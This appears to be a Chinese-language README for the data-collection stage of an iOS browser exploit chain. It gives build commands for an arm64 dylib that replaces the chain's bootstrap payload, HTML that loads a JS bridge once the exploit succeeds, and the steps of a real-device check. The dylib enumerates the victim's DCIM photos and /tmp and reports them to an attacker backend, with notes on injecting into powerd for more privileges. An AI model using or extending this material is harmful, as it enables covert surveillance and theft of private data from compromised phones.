# real_collector — 独立真实回传（不走任务链）

## 目标
- 不依赖 `/api/tasks/*` 空壳任务
- Stage3 加载 dylib 后，通过共享缓冲真正 `opendir/readdir`，回传 JSON 到 `/api/collect/report`

## 1. 在 Mac 上编译 dylib（Windows 无法产出 arm64 iOS dylib）

```bash
cd Coruna-main/data_collector
clang -arch arm64 -shared -Os \
  -o real_collector.dylib \
  -Wl,-install_name,@rpath/real_collector.dylib \
  real_collector.dylib.c

# 备份原 bootstrap 后替换
cp ../payloads/bootstrap.dylib ../payloads/bootstrap.dylib.bak
cp real_collector.dylib ../payloads/bootstrap.dylib
```

确认导出符号：

```bash
nm -gU real_collector.dylib | grep process
# 应看到 _process
```

Stage3 会解析 `payloads/bootstrap.dylib` 里的 `_process` 并调用。

## 2. 挂上 JS 桥（不走任务）

在 `group.html` 末尾 `</body>` 前增加（或内联 `real_bridge.js`）：

```html
<script src="data_collector/real_bridge.js"></script>
<script>
// exploit 成功后：
// window.RealBridge.start({ deviceUuid: _deviceUuid });
</script>
```

若已有 `window.__stage3Buffer`（Stage3 已写），也可：

```js
window.__REAL_BRIDGE_AUTO__ = true;
window.__deviceUuid = "...";
```

## 3. 后端

已有：`POST /api/collect/report`  
管理端可查 `collected_data` 表 / 相关 API。

期望 category：
- `dylib_boot` — dylib 启动
- `dylib_ping` — 存活
- `photos_list` — DCIM 枚举（真实路径列表）
- `list_tmp` — `/tmp` 枚举（验证 opendir）

## 4. 真机验收

1. 打开 `group.html`，链跑到 Stage3，日志出现：
   - `[PATCH] Loaded bootstrap.dylib...`
   - `dylib load address: 0x...`
2. 出现 `[REAL] boot: {"ok":true,"source":"real_collector"...`
3. `[REAL] list_dcim: {"ok":true,"files":[...`
4. 后台 `collected_data` 有 `source=real_collector` 记录

## 5. 权限说明

- 若 dylib 在 **WebContent/沙箱进程** 内跑：可能 `opendir(/var/mobile/Media/DCIM)` 失败，JSON 里 `count:0` 或 `opendir_failed` —— 这是**真失败**，不是假数据。
- 若已注入 **powerd** 且有更高权限：才可能枚举到 DCIM。
- `cmd:ping` 成功即证明 **dylib 真的在跑并回传**，这是第一步必须看到的。

## 6. 与假任务链的区别

| | 任务链 | real_collector |
|--|--------|----------------|
| 完成态 | 可 completed + `_skip` | 无任务状态 |
| 数据 | 常空壳 | JSON 来自 dylib |
| 证明存活 | 不可靠 | `cmd:ping` |
